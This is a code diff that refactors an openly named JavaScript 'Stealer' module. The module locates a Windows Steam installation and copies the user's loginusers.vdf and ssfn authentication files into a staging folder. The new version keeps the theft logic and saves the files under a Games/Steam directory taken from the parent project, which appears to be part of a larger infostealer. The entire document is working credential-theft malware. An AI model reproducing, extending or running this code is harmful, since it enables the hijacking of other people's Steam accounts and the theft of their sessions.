@@ -1,101 +1,71 @@
 const fs = require('fs');
 const path = require('path');
-const os = require('os');
 const util = require('util');
 const exec = util.promisify(require('child_process').exec);
-const shutil = require('fs-extra');
+const { DirectoryPath } = require('../index.js');
 
-class Utility {
-  static async getLnkFromStartMenu(appName) {
-    
-    return [path.join(process.env.APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", `${appName}.lnk`)];
-  }
-
-  static async getLnkTarget(lnkPath) {
-    try {
-      const { stdout } = await exec(`powershell -command "(New-Object -COM WScript.Shell).CreateShortcut('${lnkPath.replace(/'/g, "''")}').TargetPath"`);
-      return stdout.trim();
-    } catch (err) {
-      console.error(`Error getting target path for ${lnkPath}: ${err.message}`);
-      return null;
-    }
-  }
+async function getLnkFromStartMenu(appName) {
+  return path.join(process.env.APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", `${appName}.lnk`);
 }
 
-class Stealer {
-  constructor() {
-    this.tempFolder = path.join(os.tmpdir(), "steamsession");
-    this.steamStolen = false;
+async function getLnkTarget(lnkPath) {
+  const { stdout } = await exec(`powershell -command "(New-Object -COM WScript.Shell).CreateShortcut('${lnkPath.replace(/'/g, "''")}').TargetPath"`);
+  return stdout.trim();
+}
+
+async function findSteamPath() {
+  const lnkPath = await getLnkFromStartMenu("Steam");
+
+  if (fs.existsSync(lnkPath)) {
+    const target = await getLnkTarget(lnkPath);
+    if (target) {
+      return path.dirname(target);
+    }
   }
 
-  async stealSteam() {
-    if (Settings.CaptureGames) {
-      console.info("Stealing Steam session");
+  const defaultSteamPath = "C:\\Program Files (x86)\\Steam";
+  if (fs.existsSync(defaultSteamPath)) {
+    return defaultSteamPath;
+  }
 
-      const lnkPaths = await Utility.getLnkFromStartMenu("Steam");
-      const steamPaths = Array.from(new Set(
-        (await Promise.all(lnkPaths.map(async (lnk) => {
-          const target = await Utility.getLnkTarget(lnk);
-          return target ? path.dirname(target) : null;
-        }))).filter(Boolean)
-      ));
+  return null;
+}
 
-      const multiple = steamPaths.length > 1;
+async function stealSteam() {
+  const steamPath = await findSteamPath();
 
-      if (steamPaths.length === 0) {
-        steamPaths.push("C:\\Program Files (x86)\\Steam");
-      }
+  if (!steamPath) {
+    return;  // End the script cleanly if no Steam path is found
+  }
 
-      for (const [index, steamPath] of steamPaths.entries()) {
-        const steamConfigPath = path.join(steamPath, "config");
-        if (fs.existsSync(steamConfigPath) && fs.lstatSync(steamConfigPath).isDirectory()) {
-          const loginFile = path.join(steamConfigPath, "loginusers.vdf");
-          if (fs.existsSync(loginFile) && fs.lstatSync(loginFile).isFile()) {
-            try {
-              let _saveToPath = this.tempFolder;
-              if (multiple) {
-                _saveToPath = path.join(this.tempFolder, `Profile ${index + 1}`);
-              }
-              await fs.promises.mkdir(_saveToPath, { recursive: true });
+  const steamConfigPath = path.join(steamPath, "config");
+  if (fs.existsSync(steamConfigPath) && fs.lstatSync(steamConfigPath).isDirectory()) {
+    const gamesDir = path.join(DirectoryPath, "Games");
+    const steamDir = path.join(gamesDir, "Steam");
 
-              await fs.promises.copyFile(loginFile, path.join(_saveToPath, "loginusers.vdf"));
-              this.steamStolen = true;
-            } catch (err) {
-              console.error(`Error copying loginusers.vdf: ${err.message}`);
-            }
-          }
+    if (!fs.existsSync(gamesDir)) {
+      fs.mkdirSync(gamesDir, { recursive: true });
+    }
 
-          const filesInSteamPath = fs.readdirSync(steamPath);
-          for (const file of filesInSteamPath) {
-            if (file.startsWith("ssfn")) {
-              const ssfnFilePath = path.join(steamPath, file);
-              if (fs.existsSync(ssfnFilePath) && fs.lstatSync(ssfnFilePath).isFile()) {
-                try {
-                  let _saveToPath = this.tempFolder;
-                  if (multiple) {
-                    _saveToPath = path.join(this.tempFolder, `Profile ${index + 1}`);
-                  }
-                  await fs.promises.copyFile(ssfnFilePath, path.join(_saveToPath, file));
-                  this.steamStolen = true;
-                } catch (err) {
-                  console.error(`Error copying ${file}: ${err.message}`);
-                }
-              }
-            }
-          }
+    if (!fs.existsSync(steamDir)) {
+      fs.mkdirSync(steamDir, { recursive: true });
+    }
+
+    const loginFile = path.join(steamConfigPath, "loginusers.vdf");
+    if (fs.existsSync(loginFile) && fs.lstatSync(loginFile).isFile()) {
+      await fs.promises.copyFile(loginFile, path.join(steamDir, "loginusers.vdf"));
+    }
+
+    const filesInSteamPath = fs.readdirSync(steamPath);
+    for (const file of filesInSteamPath) {
+      if (file.startsWith("ssfn")) {
+        const ssfnFilePath = path.join(steamPath, file);
+        if (fs.existsSync(ssfnFilePath) && fs.lstatSync(ssfnFilePath).isFile()) {
+          await fs.promises.copyFile(ssfnFilePath, path.join(steamDir, file));
         }
       }
-
-      if (this.steamStolen && multiple) {
-        await fs.promises.writeFile(path.join(this.tempFolder, "Info.txt"), "Multiple Steam installations are found, so the files for each of them are put in different Profiles");
-      }
-
-      console.log(`Steam session information saved to ${this.tempFolder}`);
     }
   }
 }
 
-const Settings = { CaptureGames: true };
-
-const stealer = new Stealer();
-stealer.stealSteam();
+stealSteam();
